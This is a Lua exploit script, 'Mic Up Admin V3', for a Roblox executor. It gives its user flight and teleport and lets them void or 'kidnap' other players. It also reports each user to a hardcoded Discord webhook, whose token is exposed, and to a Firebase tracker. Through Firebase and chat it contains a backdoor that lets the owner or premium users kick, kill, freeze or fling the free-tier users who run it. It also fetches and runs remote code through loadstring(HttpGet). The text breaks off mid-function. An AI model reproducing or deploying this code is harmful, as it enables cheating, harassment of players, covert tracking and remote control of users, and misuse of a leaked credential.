--[[
    MIC UP ADMIN V3 - ULTIMATE EDITION
    Advanced admin system with comprehensive features
    
    HEARTBEAT SYSTEM:
    - Script sends heartbeat to Firebase every 60 seconds
    - Firebase stores: user_id, username, tier, status, timestamp
    - Your bot should check Firebase every minute and remove users
      whose timestamp is older than 120 seconds (2 missed heartbeats)
    - Discord webhook only used for initial connection (no spam)
    - Logos automatically appear over active users' heads
    
    FIREBASE STRUCTURE:
    /users/{user_id} = { user_id, username, display_name, tier, status, timestamp }
    /commands = { cmd, target, args }
]]

-- =============================================
-- CONFIGURATION (EDIT THESE)
-- =============================================
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1458531708075774074/Z_hob2iU-AEv-1BjgN5eI_SCDgCQOvyXORlIWSXrgm5966ZpLom58N66KZ03M0eeZ4we"
local CONFIG_URL = "https://raw.githubusercontent.com/kailon12345/Schweins-Dah3/refs/heads/main/config.json"
local FIREBASE_URL = "https://mic-up-sil-default-rtdb.firebaseio.com"
local LOGO_IMAGE = "rbxassetid://125753692300422"
local GUI_KEYBIND = Enum.KeyCode.K
local HEARTBEAT_INTERVAL = 60 -- Send heartbeat every 60 seconds

-- =============================================
-- SCRIPT START
-- =============================================

-- Cleanup
if _G.MicUpAdminActive then 
    _G.MicUpAdminActive = false
    task.wait(0.5)
end
_G.MicUpAdminActive = true

-- Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")

local lplr = Players.LocalPlayer
local camera = workspace.CurrentCamera
local mouse = lplr:GetMouse()

-- Load remote config
local function getRemoteConfig()
    local success, result = pcall(function()
        return game:HttpGet(CONFIG_URL .. "?t=" .. tick())
    end)
    if success then
        local decodeSuccess, decoded = pcall(function()
            return HttpService:JSONDecode(result)
        end)
        return decodeSuccess and decoded or nil
    end
    return nil
end

local Config = getRemoteConfig() or {}
local premiumUsers = {}
local leaderID = tonumber(Config.leaderID) or 7789664710

if Config.premiumUsers then
    for _, id in pairs(Config.premiumUsers) do
        local numId = tonumber(id)
        if numId then premiumUsers[numId] = true end
    end
end

-- State Variables
local targetPlayer = nil
local carouselTarget = nil
local animationTarget = nil
local currentTab = "Main"
local baseplatePart = nil
local baseplateColor = Color3.fromRGB(50, 50, 50)
local baseplateActive = false
local flySpeed = 70
local flying = false
local carouselFlying = false
local clickTpEnabled = false
local carouselFrozen = false
local currentAnimation = nil
local commandBarVisible = false

-- Flight controls
local keys = {W = false, S = false, A = false, D = false, Space = false, LeftShift = false}
local ctrl = {f = 0, b = 0, l = 0, r = 0, u = 0, d = 0}

-- Global tables
_G.MicUpSettings = _G.MicUpSettings or {
    ShowNotifications = true,
    GuiKeybind = GUI_KEYBIND
}

_G.Keybinds = _G.Keybinds or {
    Flight = Enum.KeyCode.F,
    ClickTP = Enum.KeyCode.C,
    PanicMode = Enum.KeyCode.P,
}

_G.FrozenPlayers = _G.FrozenPlayers or {}
_G.LoopKillTargets = _G.LoopKillTargets or {}
_G.ScriptUsers = _G.ScriptUsers or {}

-- Utility Functions
local function notify(title, text, duration)
    if not _G.MicUpSettings.ShowNotifications then return end
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 3
    })
end

local function getUserTier()
    if lplr.UserId == leaderID then return "Owner" end
    if premiumUsers[lplr.UserId] then return "Premium" end
    return "Free"
end

local function getRoot(char)
    return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso"))
end

local function sendWebhook(content)
    local req = (syn and syn.request) or request or http_request
    if req then
        task.spawn(function()
            pcall(function()
                req({
                    Url = DISCORD_WEBHOOK,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({content = content})
                })
            end)
        end)
    end
end

local function isPremium(userId)
    return premiumUsers[userId] == true
end

-- Logo System
local function addLogo(p)
    if not p or not p.Character then return end
    local h = p.Character:FindFirstChild("Head")
    if h and not p.Character:FindFirstChild("MicUpLogo") then
        local b = Instance.new("BillboardGui", p.Character)
        b.Name = "MicUpLogo"
        b.Size = UDim2.new(1.2, 0, 1.2, 0)
        b.Adornee = h
        b.AlwaysOnTop = true
        b.ExtentsOffset = Vector3.new(0, 3, 0)
        local i = Instance.new("ImageLabel", b)
        i.Size = UDim2.new(1, 0, 1, 0)
        i.BackgroundTransparency = 1
        i.Image = LOGO_IMAGE
        Instance.new("UICorner", i).CornerRadius = UDim.new(1, 0)
    end
end

local function updateAllLogos()
    for _, p in pairs(Players:GetPlayers()) do
        if _G.ScriptUsers[p.UserId] then
            addLogo(p)
        end
    end
end

-- Register this user
_G.ScriptUsers[lplr.UserId] = true

-- Send initial connection to Discord (one-time)
sendWebhook(string.format("**[%s]** `%s` (ID: %d) loaded Mic Up Admin", getUserTier(), lplr.DisplayName, lplr.UserId))

-- Heartbeat System - Send to Firebase every 60 seconds
local function sendHeartbeat()
    pcall(function()
        local data = {
            user_id = lplr.UserId,
            username = lplr.Name,
            display_name = lplr.DisplayName,
            tier = getUserTier(),
            status = "active",
            timestamp = os.time()
        }
        
        local req = (syn and syn.request) or request or http_request
        if req then
            req({
                Url = FIREBASE_URL .. "/users/" .. lplr.UserId .. ".json",
                Method = "PUT",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end

-- Send initial heartbeat immediately
sendHeartbeat()

-- Start heartbeat loop
task.spawn(function()
    while _G.MicUpAdminActive do
        task.wait(HEARTBEAT_INTERVAL)
        sendHeartbeat()
    end
end)

-- Flight System
UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    local key = input.KeyCode.Name
    if keys[key] ~= nil then keys[key] = true end
    
    if input.KeyCode == Enum.KeyCode.W then ctrl.f = 1
    elseif input.KeyCode == Enum.KeyCode.S then ctrl.b = -1
    elseif input.KeyCode == Enum.KeyCode.A then ctrl.l = -1
    elseif input.KeyCode == Enum.KeyCode.D then ctrl.r = 1
    elseif input.KeyCode == Enum.KeyCode.Space then ctrl.u = 1
    elseif input.KeyCode == Enum.KeyCode.LeftShift then ctrl.d = 1
    end
end)

UIS.InputEnded:Connect(function(input, gpe)
    local key = input.KeyCode.Name
    if keys[key] ~= nil then keys[key] = false end
    
    if input.KeyCode == Enum.KeyCode.W then ctrl.f = 0
    elseif input.KeyCode == Enum.KeyCode.S then ctrl.b = 0
    elseif input.KeyCode == Enum.KeyCode.A then ctrl.l = 0
    elseif input.KeyCode == Enum.KeyCode.D then ctrl.r = 0
    elseif input.KeyCode == Enum.KeyCode.Space then ctrl.u = 0
    elseif input.KeyCode == Enum.KeyCode.LeftShift then ctrl.d = 0
    end
end)

local function getFlightDirection()
    local direction = Vector3.new(0, 0, 0)
    if keys.W then direction = direction + camera.CFrame.LookVector end
    if keys.S then direction = direction - camera.CFrame.LookVector end
    if keys.A then direction = direction - camera.CFrame.RightVector end
    if keys.D then direction = direction + camera.CFrame.RightVector end
    if keys.Space then direction = direction + Vector3.new(0, 1, 0) end
    if keys.LeftShift then direction = direction - Vector3.new(0, 1, 0) end
    return direction
end

local function startFlight()
    flying = true
    local char = lplr.Character
    if not char then return end
    local root = getRoot(char)
    if not root then return end
    
    local bv = Instance.new("BodyVelocity", root)
    bv.Name = "AdminFlyVelocity"
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = Vector3.zero
    
    local bg = Instance.new("BodyGyro", root)
    bg.Name = "AdminFlyGyro"
    bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    bg.P = 9e4
    bg.CFrame = root.CFrame
    
    RunService:BindToRenderStep("AdminFlight", 1, function()
        if not flying then return end
        local dir = getFlightDirection()
        if bv and bv.Parent then
            bv.Velocity = dir * flySpeed
        end
        if bg and bg.Parent then
            bg.CFrame = camera.CFrame
        end
    end)
    
    notify("Flight", "Enabled - Use WASD + Space/Shift", 3)
end

local function stopFlight()
    flying = false
    RunService:UnbindFromRenderStep("AdminFlight")
    
    local root = getRoot(lplr.Character)
    if root then
        if root:FindFirstChild("AdminFlyVelocity") then
            root.AdminFlyVelocity:Destroy()
        end
        if root:FindFirstChild("AdminFlyGyro") then
            root.AdminFlyGyro:Destroy()
        end
    end
    
    notify("Flight", "Disabled", 2)
end

-- Carousel Functions
local function getCarousel()
    local map = workspace:FindFirstChild("map")
    return map and map:FindFirstChild("carousel")
end

local function getCarouselSeats()
    local carousel = getCarousel()
    if not carousel then return {} end
    
    local seats = {}
    for _, v in pairs(carousel:GetDescendants()) do
        if v:IsA("Seat") or v:IsA("VehicleSeat") then
            table.insert(seats, v)
        end
    end
    return seats
end

local function setCarouselCollision(enabled)
    local carousel = getCarousel()
    if not carousel then return end
    
    for _, v in pairs(carousel:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = enabled
        end
    end
end

local function sitInCarousel(seatIndex)
    local seats = getCarouselSeats()
    if #seats == 0 then
        notify("Error", "No carousel seats found", 3)
        return nil
    end
    
    local seat = seats[seatIndex or 1]
    if seat then
        local root = getRoot(lplr.Character)
        if root then
            root.CFrame = seat.CFrame
            task.wait(0.3)
            seat:Sit(lplr.Character.Humanoid)
            return seat
        end
    end
    return nil
end

local function detachCarousel()
    local carousel = getCarousel()
    if not carousel then
        notify("Error", "Carousel not found", 3)
        return
    end
    
    setCarouselCollision(false)
    
    for _, v in pairs(carousel:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Anchored = false
        end
    end
    
    notify("Carousel", "Detached and collision disabled", 2)
end

local function freezeCarousel()
    carouselFrozen = true
    local carousel = getCarousel()
    if not carousel then
        notify("Error", "Carousel not found", 3)
        return
    end
    
    for _, v in pairs(carousel:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Anchored = true
            v.Velocity = Vector3.zero
        end
    end
    
    notify("Carousel", "Frozen in place", 2)
end

local function unfreezeCarousel()
    carouselFrozen = false
    local carousel = getCarousel()
    if not carousel then
        notify("Error", "Carousel not found", 3)
        return
    end
    
    for _, v in pairs(carousel:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Anchored = false
        end
    end
    
    notify("Carousel", "Unfrozen", 2)
end

local function voidCarousel()
    local root = getRoot(lplr.Character)
    if not root then return end
    
    local originalPos = root.CFrame
    
    notify("Void", "Giving anti-void...", 2)
    
    -- Give anti-void (high position)
    root.CFrame = CFrame.new(originalPos.Position + Vector3.new(0, 500, 0))
    task.wait(0.3)
    
    -- Void everyone in carousel
    notify("Void", "Voiding carousel occupants...", 2)
    local seats = getCarouselSeats()
    for _, seat in pairs(seats) do
        if seat.Occupant then
            local player = Players:GetPlayerFromCharacter(seat.Occupant.Parent)
            if player and player ~= lplr then
                local targetRoot = getRoot(player.Character)
                if targetRoot then
                    targetRoot.CFrame = CFrame.new(0, -1000, 0)
                end
            end
        end
    end
    
    task.wait(1)
    
    -- Return to original position
    notify("Void", "Returning to position...", 2)
    root.CFrame = originalPos
    notify("Void", "Complete!", 2)
end

local function startCarouselFlight()
    local carousel = getCarousel()
    if not carousel then
        notify("Error", "Carousel not found", 3)
        return
    end
    
    carouselFlying = true
    
    local mainSeat = nil
    for _, seat in pairs(getCarouselSeats()) do
        if seat.Occupant and seat.Occupant.Parent == lplr.Character then
            mainSeat = seat
            break
        end
    end
    
    if not mainSeat then
        notify("Error", "Sit in a carousel seat first", 3)
        carouselFlying = false
        return
    end
    
    local bv = Instance.new("BodyVelocity", mainSeat)
    bv.Name = "CarouselFlyVelocity"
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = Vector3.zero
    
    local bg = Instance.new("BodyGyro", mainSeat)
    bg.Name = "CarouselFlyGyro"
    bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    bg.P = 9e4
    bg.CFrame = mainSeat.CFrame
    
    RunService:BindToRenderStep("CarouselFlight", 1, function()
        if not carouselFlying or carouselFrozen then return end
        local dir = getFlightDirection()
        if bv and bv.Parent then
            bv.Velocity = dir * flySpeed
        end
        if bg and bg.Parent then
            bg.CFrame = camera.CFrame
        end
    end)
    
    notify("Carousel", "Flying enabled - Use WASD", 3)
end

local function stopCarouselFlight()
    carouselFlying = false
    carouselFrozen = false
    RunService:UnbindFromRenderStep("CarouselFlight")
    
    local carousel = getCarousel()
    if carousel then
        for _, seat in pairs(getCarouselSeats()) do
            if seat:FindFirstChild("CarouselFlyVelocity") then
                seat.CarouselFlyVelocity:Destroy()
            end
            if seat:FindFirstChild("CarouselFlyGyro") then
                seat.CarouselFlyGyro:Destroy()
            end
        end
    end
    
    notify("Carousel", "Flying disabled", 2)
end

local function carouselAbduction()
    if not carouselTarget or not carouselTarget.Character then
        notify("Error", "Select a carousel target first", 3)
        return
    end
    
    local secretRoomPos = Vector3.new(-179.728806, 4.000000, 72196.132812)
    local myRoot = getRoot(lplr.Character)
    local targetRoot = getRoot(carouselTarget.Character)
    
    if not myRoot or not targetRoot then return end
    
    notify("Abduction", "Step 1: Sitting in carousel...", 2)
    
    local seat = sitInCarousel(1)
    if not seat then return end
    
    task.wait(0.5)
    
    notify("Abduction", "Step 2: Detaching carousel...", 2)
    detachCarousel()
    task.wait(0.3)
    
    notify("Abduction", "Step 3: Teleporting to target...", 2)
    local carousel = getCarousel()
    if carousel then
        local basePart = carousel:FindFirstChildWhichIsA("BasePart")
        if basePart then
            local offset = basePart.Position
            local targetPos = targetRoot.Position + Vector3.new(5, 0, 0)
            for _, v in pairs(carousel:GetDescendants()) do
                if v:IsA("BasePart") then
                    local relativePos = v.Position - offset
                    v.CFrame = CFrame.new(targetPos + relativePos) * (v.CFrame - v.Position)
                end
            end
        end
    end
    
    task.wait(0.5)
    
    notify("Abduction", "Step 4: Collecting target...", 2)
    local seats = getCarouselSeats()
    local oppositeSeat = seats[math.ceil(#seats / 2)]
    if oppositeSeat then
        targetRoot.CFrame = oppositeSeat.CFrame
        task.wait(0.3)
        oppositeSeat:Sit(carouselTarget.Character.Humanoid)
    end
    
    task.wait(0.5)
    
    startCarouselFlight()
    task.wait(1)
    
    notify("Abduction", "Step 5: Flying to tea party...", 2)
    if carousel then
        local basePart = carousel:FindFirstChildWhichIsA("BasePart")
        if basePart then
            local offset = basePart.Position
            for _, v in pairs(carousel:GetDescendants()) do
                if v:IsA("BasePart") then
                    local relativePos = v.Position - offset
                    v.CFrame = CFrame.new(secretRoomPos + relativePos) * (v.CFrame - v.Position)
                end
            end
        end
    end
    
    task.wait(0.5)
    
    notify("Abduction", "Arrived at tea party! Position frozen.", 3)
    freezeCarousel()
end

-- Animation Functions
local animationIds = {
    ["Default Dance"] = "rbxassetid://5938391146",
    ["Floss"] = "rbxassetid://5917459365",
    ["Orange Justice"] = "rbxassetid://5938365243",
    ["Take The L"] = "rbxassetid://5915714366",
    ["Griddy"] = "rbxassetid://11710529975",
    ["Kai Cenat"] = "rbxassetid://13825966891",
    ["TikTok Rizz"] = "rbxassetid://13244837318",
    ["Wave"] = "rbxassetid://507770239",
    ["Point"] = "rbxassetid://507770453",
    ["Laugh"] = "rbxassetid://507770818",
    ["Cheer"] = "rbxassetid://507770677",
    ["Thrusting"] = "rbxassetid://148840371",
    ["Twerk"] = "rbxassetid://5918726674",
    ["Catwalk"] = "rbxassetid://5938413064",
    ["Hero Landing"] = "rbxassetid://5104344710",
    ["Chill"] = "rbxassetid://3695333486",
    ["Sit"] = "rbxassetid://507768133",
    ["Robloxian"] = "rbxassetid://5101907645"
}

local function stopAllAnimations()
    local char = lplr.Character
    if not char then return end
    
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    
    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
        track:Stop()
    end
    
    currentAnimation = nil
    notify("Animation", "All animations stopped", 2)
end

local function playAnimation(animName, targetChar)
    local char = targetChar or lplr.Character
    if not char then return end
    
    local animId = animationIds[animName]
    if not animId then return end
    
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    
    local anim = Instance.new("Animation")
    anim.AnimationId = animId
    
    local track = humanoid:LoadAnimation(anim)
    track:Play()
    
    if char == lplr.Character then
        currentAnimation = track
    end
    
    notify("Animation", animName .. " playing", 2)
end

-- Command Bar System
local commandBarGui = nil

local function createCommandBar()
    if commandBarGui then commandBarGui:Destroy() end
    
    commandBarGui = Instance.new("ScreenGui", lplr.PlayerGui)
    commandBarGui.Name = "CommandBar"
    commandBarGui.ResetOnSpawn = false
    commandBarGui.DisplayOrder = 1000
    
    local frame = Instance.new("Frame", commandBarGui)
    frame.Size = UDim2.new(0.5, 0, 0, 40)
    frame.Position = UDim2.new(0.25, 0, 0, 10)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    
    local corner = Instance.new("UICorner", frame)
    corner.CornerRadius = UDim.new(0, 8)
    
    local textBox = Instance.new("TextBox", frame)
    textBox.Size = UDim2.new(1, -20, 1, -10)
    textBox.Position = UDim2.new(0, 10, 0, 5)
    textBox.BackgroundTransparency = 1
    textBox.TextColor3 = Color3.new(1, 1, 1)
    textBox.PlaceholderText = "Enter command..."
    textBox.Text = ""
    textBox.TextXAlignment = Enum.TextXAlignment.Left
    textBox.Font = Enum.Font.Code
    textBox.TextSize = 16
    textBox.ClearTextOnFocus = false
    
    textBox.FocusLost:Connect(function(enterPressed)
        if enterPressed and textBox.Text ~= "" then
            -- Execute command silently (no chat)
            local cmd = ";" .. textBox.Text
            handleCommand(cmd, {UserId = lplr.UserId, Character = lplr.Character})
            textBox.Text = ""
        end
        commandBarGui.Enabled = false
        commandBarVisible = false
    end)
    
    commandBarGui.Enabled = false
    
    return textBox
end

local commandTextBox = createCommandBar()

UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    
    if input.KeyCode == Enum.KeyCode.Semicolon then
        commandBarVisible = not commandBarVisible
        commandBarGui.Enabled = commandBarVisible
        if commandBarVisible then
            task.wait()
            commandTextBox:CaptureFocus()
        end
    end
end)

-- Command System (Silent Execution)
local function handleCommand(m, speaker)
    local a = string.split(m:lower(), " ")
    local cmd = a[1]
    if cmd == "/e" and a[2] and a[2]:sub(1,1) == ";" then
        table.remove(a, 1)
        cmd = a[1]
    end
    local target = a[2] or "all"
    
    local speakerIsHost = (speaker.UserId == leaderID)
    local speakerIsPremium = isPremium(speaker.UserId)

    if not speakerIsHost and not speakerIsPremium then return end

    local myTier = getUserTier()
    
    if speakerIsPremium and not speakerIsHost then
        if myTier == "Owner" or myTier == "Premium" then
            return
        end
    end
    
    local isHost = (lplr.UserId == leaderID)
    local isT = (target == "all") or (target == lplr.Name:lower()) or (lplr.Name:lower():sub(1, #target) == target)
    if not isT then return end

    local c = lplr.Character
    local h = c and c:FindFirstChildOfClass("Humanoid")
    local r = getRoot(c)

    if cmd == ";check" or cmd == ";users" then
        return
    end

    if isHost then return end
    if myTier == "Premium" or myTier == "Owner" then return end

    if cmd == ";freeze" then
        _G.FrozenPlayers[lplr.UserId] = true
    elseif cmd == ";unfreeze" then
        _G.FrozenPlayers[lplr.UserId] = false
        if h then 
            h.WalkSpeed = 16 
            h.JumpPower = 50
            h.JumpHeight = 7.2
        end
        if c then
            for _, part in pairs(c:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored = false
                end
            end
        end
    elseif cmd == ";kick" then
        lplr:Kick("Kicked by " .. speaker.Name)
    elseif cmd == ";kill" then
        if h then h.Health = 0 end
    elseif cmd == ";loopkill" then
        _G.LoopKillTargets[lplr.UserId] = true
    elseif cmd == ";unloop" then
        _G.LoopKillTargets[lplr.UserId] = false
    elseif cmd == ";void" then
        if r then r.CFrame = CFrame.new(0, -1000, 0) end
    elseif cmd == ";fling" then
        if r and h then
            r.Anchored = true
            local bv = Instance.new("BodyVelocity", r)
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(math.random(-200, 200), 300, math.random(-200, 200))
            r.Anchored = false
            task.wait(0.1)
            if bv and bv.Parent then bv:Destroy() end
        end
    elseif cmd == ";sit" then
        if h then h.Sit = true end
    elseif cmd == ";jump" then
        if h then h.Jump = true end
    elseif cmd == ";bring" then
        local speakerRoot = speaker and speaker.Character and getRoot(speaker.Character)
        if speakerRoot and r then
            r.CFrame = speakerRoot.CFrame * CFrame.new(0, 0, -3)
        end
    elseif cmd == ";disableanim" or cmd == ";stopanims" then
        stopAllAnimations()
    end
end

-- Firebase polling
task.spawn(function()
    while _G.MicUpAdminActive do
        pcall(function()
            local res = HttpService:GetAsync(FIREBASE_URL .. "/commands.json?t=" .. tick())
            local data = HttpService:JSONDecode(res)
            
            if data and (data.target == "all" or data.target == lplr.Name) then
                local cmd = ";" .. data.cmd
                if data.args then cmd = cmd .. " " .. data.args end
                handleCommand(cmd, {UserId = leaderID, Character = nil})
            end
        end)
        task.wait(2)
    end
end)

-- Monitor frozen/loop kill
task.spawn(function()
    while task.wait(0.05) do
        for userId, frozen in pairs(_G.FrozenPlayers) do
            if frozen then
                local p = game.Players:GetPlayerByUserId(userId)
                if p and p.Character then
                    local h = p.Character:FindFirstChildOfClass("Humanoid")
                    local root = getRoot(p.Character)
                    if h then
                        h.WalkSpeed = 0
                        h.JumpPower = 0
                        h.JumpHeight = 0
                    end
                    if root then
                        root.Anchored = true
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                    end
                end
            end
        end
    end
end)

task.spawn(function()
    while task.wait(0.1) do
        for userId, active in pairs(_G.LoopKillTargets) do
            if active then
                local p = game.Players:GetPlayerByUserId(userId)
                if p and p.Character then
                    local h = p.Character:FindFirstChildOfClass("Humanoid")
                    if h and h.Health > 0 then h.Health = 0 end
                end
            end
        end
    end
end)

-- Logo monitoring - Check Firebase for active users
task.spawn(function()
    while task.wait(5) do
        pcall(function()
            -- Get all active users from Firebase
            local res = HttpService:GetAsync(FIREBASE_URL .. "/users.json?t=" .. tick())
            local users = HttpService:JSONDecode(res)
            
            if users then
                -- Clear old script users
                _G.ScriptUsers = {}
                
                -- Add active users
                for userId, userData in pairs(users) do
                    local numId = tonumber(userId)
                    if numId and userData.status == "active" then
                        -- Check if timestamp is recent (within 2 minutes)
                        local timeDiff = os.time() - userData.timestamp
                        if timeDiff < 120 then
                            _G.ScriptUsers[numId] = true
                        end
                    end
                end
                
                -- Update logos
                updateAllLogos()
            end
        end)
    end
end)

Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function()
        task.wait(1)
        updateAllLogos()
    end)
end)

-- Chat monitoring (for external commands)
Players.PlayerChatted:Connect(function(s, p, m)
    if p.UserId == leaderID or isPremium(p.UserId) then 
        handleCommand(m, p) 
    end
end)

local textChat = game:GetService("TextChatService")
if textChat.ChatVersion == Enum.ChatVersion.TextChatService then
    textChat.MessageReceived:Connect(function(o)
        if o.TextSource then
            local p = game.Players:GetPlayerByUserId(o.TextSource.UserId)
            if p and (p.UserId == leaderID or isPremium(p.UserId)) then 
                handleCommand(o.Text, p) 
            end
        end
    end)
end

-- UI Creation
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Mic Up Admin V3 | " .. getUserTier(),
    LoadingTitle = "Loading Admin...",
    LoadingSubtitle = "by [Schwein]",
    ConfigurationSaving = {Enabled = false},
    KeySystem = false
})

-- Main Tab
local MainTab = Window:CreateTab("ðŸ  Main", 4483362458)

MainTab:CreateSection("Target Selection")

local MainTargetInput = MainTab:CreateInput({
    Name = "Select Target Player",
    PlaceholderText = "Username...",
    Callback = function(Text)
        for _, p in pairs(Players:GetPlayers()) do
            if p.Name:lower():find(Text:lower()) or p.DisplayName:lower():find(Text:lower()) then
                targetPlayer = p
                notify("Target", "Selected: " .. p.DisplayName, 2)
                return
            end
        end
    end
})

MainTab:CreateButton({
    Name = "Select Closest Player",
    Callback = function()
        local closest, minDist = nil, math.huge
        local myRoot = getRoot(lplr.Character)
        if myRoot then
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= lplr and p.Character then
                    local root = getRoot(p.Character)
                    if root then
                        local dist = (myRoot.Position - root.Position).Magnitude
                        if dist < minDist then
                            minDist, closest = dist, p
                        end
                    end
                end
            end
            if closest then
                targetPlayer = closest
                MainTargetInput:Set(closest.DisplayName)
                notify("Target", "Selected: " .. closest.DisplayName, 2)
            end
        end
    end
})

MainTab:CreateLabel("Tip: Ctrl+Click a player to select (Main)")
MainTab:CreateLabel("Hold ; key for command bar")

MainTab:CreateSection("Movement")

MainTab:CreateToggle({
    Name = "Flight",
    CurrentValue = false,
    Callback = function(Value)
        if Value then startFlight() else stopFlight() end
    end
})

MainTab:CreateSlider({
    Name = "Flight Speed",
    Range = {10, 200},
    Increment = 5,
    CurrentValue = 70,
    Callback = function(Value)
        flySpeed = Value
    end
})

MainTab:CreateToggle({
    Name = "Click Teleport",
    CurrentValue = false,
    Callback = function(Value)
        clickTpEnabled = Value
        notify("Click TP", Value and "Enabled" or "Disabled", 2)
    end
})

-- Carousel Tab
local CarouselTab = Window:CreateTab("ðŸŽ  Carousel", 4483362458)

CarouselTab:CreateSection("Target Selection")

local CarouselTargetInput = CarouselTab:CreateInput({
    Name = "Select Carousel Target",
    PlaceholderText = "Username...",
    Callback = function(Text)
        for _, p in pairs(Players:GetPlayers()) do
            if p.Name:lower():find(Text:lower()) or p.DisplayName:lower():find(Text:lower()) then
                carouselTarget = p
                notify("Carousel Target", "Selected: " .. p.DisplayName, 2)
                return
            end
        end
    end
})

CarouselTab:CreateButton({
    Name = "Select Closest Player",
    Callback = function()
        local closest, minDist = nil, math.huge
        local myRoot = getRoot(lplr.Character)
        if myRoot then
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= lplr and p.Character then
                    local root = getRoot(p.Character)
                    if root then
                        local dist = (myRoot.Position - root.Position).Magnitude
                        if dist < minDist then
                            minDist, closest = dist, p
                        end
                    end
                end
            end
            if closest then
                carouselTarget = closest
                CarouselTargetInput:Set(closest.DisplayName)
                notify("Carousel Target", "Selected: " .. closest.DisplayName, 2)
            end
        end
    end
})

CarouselTab:CreateLabel("Tip: Ctrl+Click while in Carousel tab")

CarouselTab:CreateSection("Carousel Controls")

CarouselTab:CreateButton({
    Name = "Sit in Carousel",
    Callback = function()
        sitInCarousel(1)
    end
})

CarouselTab:CreateButton({
    Name = "Detach Carousel",
    Callback = function()
        detachCarousel()
    end
})

CarouselTab:CreateToggle({
    Name = "Carousel Flight",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            startCarouselFlight()
        else
            stopCarouselFlight()
        end
    end
})

CarouselTab:CreateButton({
    Name = "â„ï¸ Freeze Carousel",
    Callback = function()
        freezeCarousel()
    end
})

CarouselTab:CreateButton({
    Name = "ðŸ”¥ Unfreeze Carousel",
    Callback = function()
        unfreezeCarousel()
    end
})

CarouselTab:CreateSection("Special Actions")

CarouselTab:CreateButton({
    Name = "ðŸ›¸ Full Carousel Kidnapping",
    Callback = function()
        carouselAbduction()
    end
})

CarouselTab:CreateButton({
    Name = "ðŸŒŒ Void Carousel (Anti-Void)",
    Callback = function()
        voidCarousel()
    end
})

CarouselTab:CreateButton({
    Name = "TP to Secret Room (Solo)",
    Callback = function()
        local root = getRoot(lplr.Character)
        if root then
            root.CFrame = CFrame.new(-179.728806, 4.000000, 72196.132812)
        end
    end
})

CarouselTab:CreateLabel("")
CarouselTab:CreateLabel("Go through portal to return carousel!")

-- Animations Tab
local AnimTab = Window:CreateTab("ðŸ’ƒ Animations", 4483362458)

AnimTab:CreateSection("Animation Target")

local AnimTargetInput = AnimTab:CreateInput({
    Name = "Select Animation Target",
    PlaceholderText = "Leave empty for self...",
    Callback = function(Text)
        if Text == "" then
            animationTarget = nil
            notify("Anim Target", "Set to self", 2)
            return
        end
        for _, p in pairs(Players:GetPlayers()) do
            if p.Name:lower():find(Text:lower()) or p.DisplayName:lower():find(Text:lower()) then
                animationTarget = p
                notify("Anim Target", "Selected: " .. p.DisplayName, 2)
                return
            end
        end
    end
})

AnimTab:CreateLabel("Tip: Ctrl+Click while in Animations tab")

AnimTab:CreateSection("Animation Controls")

AnimTab:CreateButton({
    Name = "ðŸ›‘ DISABLE ALL ANIMATIONS",
    Callback = function()
        stopAllAnimations()
    end
})

AnimTab:CreateLabel("")

for animName, _ in pairs(animationIds) do
    AnimTab:CreateButton({
        Name = animName,
        Callback = function()
            local targetChar = animationTarget and animationTarget.Character or lplr.Character
            playAnimation(animName, targetChar)
        end
    })
end

-- Commands Tab
local CommandsTab = Window:CreateTab("âš¡ Commands", 4483362458)

CommandsTab:CreateSection("Command System")

CommandsTab:CreateLabel("Commands can be executed:")
CommandsTab:CreateLabel("â€¢ Command bar: Hold ; key (Silent)")
CommandsTab:CreateLabel("â€¢ Firebase/Discord bot")
CommandsTab:CreateLabel("")

CommandsTab:CreateButton({
    Name = "ðŸ“‹ Show All Commands (F9 Console)",
    Callback = function()
        print("=== MIC UP ADMIN COMMANDS ===")
        print("Press F9 or type /console to see this list")
        print("")
        print("CONTROL COMMANDS:")
        print(";check [target] - Check users")
        print(";freeze [target] - Freeze player")
        print(";unfreeze [target] - Unfreeze player")
        print(";bring [target] - Bring player to you")
        print("")
        print("ACTION COMMANDS:")
        print(";kill [target] - Kill player")
        print(";loopkill [target] - Loop kill")
        print(";unloop [target] - Stop loop kill")
        print(";fling [target] - Fling player")
        print(";void [target] - Send to void")
        print(";sit [target] - Make sit")
        print(";jump [target] - Make jump")
        print(";disableanim [target] - Stop animations")
        print("")
        print("HOST ONLY:")
        print(";kick [target] - Kick player")
        print("")
        print("TARGET: Use 'all' or player name")
        print("Example: ;freeze john")
        print("=====================================")
        notify("Commands", "List printed to console (F9)", 3)
    end
